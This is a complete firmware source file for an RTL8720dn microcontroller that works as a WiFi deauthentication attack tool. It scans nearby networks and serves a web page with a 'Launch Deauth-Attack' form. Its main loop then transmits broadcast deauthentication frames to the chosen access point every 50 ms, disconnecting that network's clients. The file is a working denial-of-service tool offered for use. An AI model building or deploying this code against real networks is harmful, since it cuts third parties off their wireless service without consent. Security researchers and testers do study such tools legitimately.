#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// LEDs:
//  Red: System usable, Web server active etc.
//  Green: Web Server communication happening
//  Blue: Deauth-Frame being sent

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
} WiFiScanResult;

char *ssid = "RTL8720dn-Deauther";
char *pass = "0123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint16_t deauth_reason;

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) { 
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char*) record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

std::map<String, String> parsePost(String &request) {
    std::map<String, String> post_params;

    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params;
    }
    body_start += 4;

    String post_data = request.substring(body_start);

    int start = 0;
    int end = post_data.indexOf('&', start);

    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');

        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params[key] = value;
        }

        start = end + 1;
        end = post_data.indexOf('&', start);
    }

    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params[key] = value;
    }

    return post_params;
}


String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}

void handleRoot(WiFiClient &client) {
  String html = "<html><body>";
  html += "<h1>RTL8720dn-Deauther</h1>";
  html += "<h2>WiFi Networks:</h2>";
  html += "<table border='1'><tr><th>Number</th><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Frequency</th></tr>";
  for (int i = 0; i < scan_results.size(); i++) {
    html += "<tr><td>" + String(i) + "</td><td>" + scan_results[i].ssid + "</td><td>" + scan_results[i].bssid_str + "</td><td>" + String(scan_results[i].channel) + "</td><td>" + String(scan_results[i].rssi) + "</td><td>" + ((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</tr>";
  }
  html += "</table>";
  html += "<form method='post' action='/rescan'><input type='submit' value='Rescan networks'></form><hr>";
  html += "<form method='post' action='/deauth'>Network Number: <input type='text' name='net_num'><br>Reason code: <input type='text' name='reason'><br><input type='submit' value='Launch Deauth-Attack'></form>";
  html += "<form method='post' action='/stop'><input type='submit' value='Stop Deauth-Attack'></form>";
  
  html += "<table border='1'><tr><th>Reason code</th><th>Meaning</th></tr>";
  html += "<tr><td>0</td><td>Reserved.</td></tr>";
  html += "<tr><td>1</td><td>Unspecified reason.</td></tr>";
  html += "<tr><td>2</td><td>Previous authentication no longer valid.</td></tr>";
  html += "<tr><td>3</td><td>Deauthenticated because sending station (STA) is leaving or has left Independent Basic Service Set (IBSS) or ESS.</td></tr>";
  html += "<tr><td>4</td><td>Disassociated due to inactivity.</td></tr>";
  html += "<tr><td>5</td><td>Disassociated because WAP device is unable to handle all currently associated STAs.</td></tr>";
  html += "<tr><td>6</td><td>Class 2 frame received from nonauthenticated STA.</td></tr>";
  html += "<tr><td>7</td><td>Class 3 frame received from nonassociated STA.</td></tr>";
  html += "<tr><td>8</td><td>Disassociated because sending STA is leaving or has left Basic Service Set (BSS).</td></tr>";
  html += "<tr><td>9</td><td>STA requesting (re)association is not authenticated with responding STA.</td></tr>";
  html += "<tr><td>10</td><td>Disassociated because the information in the Power Capability element is unacceptable.</td></tr>";
  html += "<tr><td>11</td><td>Disassociated because the information in the Supported Channels element is unacceptable.</td></tr>";
  html += "<tr><td>12</td><td>Disassociated due to BSS Transition Management.</td></tr>";
  html += "<tr><td>13</td><td>Invalid element, that is, an element defined in this standard for which the content does not meet the specifications in Clause 8.</td></tr>";
  html += "<tr><td>14</td><td>Message integrity code (MIC) failure.</td></tr>";
  html += "<tr><td>15</td><td>4-Way Handshake timeout.</td></tr>";
  html += "<tr><td>16</td><td>Group Key Handshake timeout.</td></tr>";
  html += "<tr><td>17</td><td>Element in 4-Way Handshake different from (Re)Association Request/ Probe Response/Beacon frame.</td></tr>";
  html += "<tr><td>18</td><td>Invalid group cipher.</td></tr>";
  html += "<tr><td>19</td><td>Invalid pairwise cipher.</td></tr>";
  html += "<tr><td>20</td><td>Invalid AKMP.</td></tr>";
  html += "<tr><td>21</td><td>Unsupported RSNE version.</td></tr>";
  html += "<tr><td>22</td><td>Invalid RSNE capabilities.</td></tr>";
  html += "<tr><td>23</td><td>IEEE 802.1X authentication failed.</td></tr>";
  html += "<tr><td>24</td><td>Cipher suite rejected because of the security policy.</td></tr>";
  html += "</table>";
  
  html += "</body></html>";

  String response = makeResponse(200, "text/html");
  response += html;
  client.write(response.c_str());
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}

void startDeauth(int network_num) {
  digitalWrite(LED_R, LOW);
  current_channel = scan_results[network_num].channel;
  wifi_off();
  delay(100);
  wifi_on(RTW_MODE_AP);
  WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str());
  deauth_running = true;
  memcpy(deauth_bssid, scan_results[network_num].bssid, 6);
  DEBUG_SER_PRINT("Starting Deauth-Attack on: " + scan_results[network_num].ssid + "\n");
  digitalWrite(LED_R, HIGH);
}

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str());
  if (scanNetworks() != 0) {
    while(true) delay(1000);
  }

  #ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
  #endif

  server.begin();

  digitalWrite(LED_R, HIGH);
}

void loop() {
  WiFiClient client = server.available();
  if (client.connected()) {
    digitalWrite(LED_G, HIGH);
    String request;
    while(client.available()) {
      while (client.available()) request += (char) client.read();
      delay(1);
    }
    DEBUG_SER_PRINT(request);
    String path = parseRequest(request);
    DEBUG_SER_PRINT("Requested path: " + path + "\n");

    if (path == "/") {
      handleRoot(client);
    } else if (path == "/rescan") {
      client.write(makeRedirect("/").c_str());
      if (scanNetworks() != 0) {
        while(true) delay(1000);
      }
    } else if (path == "/deauth") {
      std::map<String, String> post_data = parsePost(request);
      int network_num;
      bool post_valid = true;
      if (post_data.size() == 2) {
        for (auto& param : post_data) {
          if (param.first == "net_num") {
            network_num = String(param.second).toInt();
          } else if (param.first == "reason") {
            deauth_reason = String(param.second).toInt();
          } else {
            post_valid = false;
            break;
          }
        }
      } else {
        post_valid = false;
      }
      client.write(makeRedirect("/").c_str());
      if (post_valid) {
        startDeauth(network_num);
      } else {
        DEBUG_SER_PRINT("Received invalid post request!\n");
      }
    } else if (path == "/stop") {
      deauth_running = false;
      DEBUG_SER_PRINT("Deauth-Attack stopped!");
      client.write(makeRedirect("/").c_str());
    } else {
      handle404(client);
    }

    client.stop();
    digitalWrite(LED_G, LOW);
  }
  if (deauth_running) {
    digitalWrite(LED_B, HIGH);
    wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    delay(50);
    digitalWrite(LED_B, LOW);
  }
  delay(50);
}
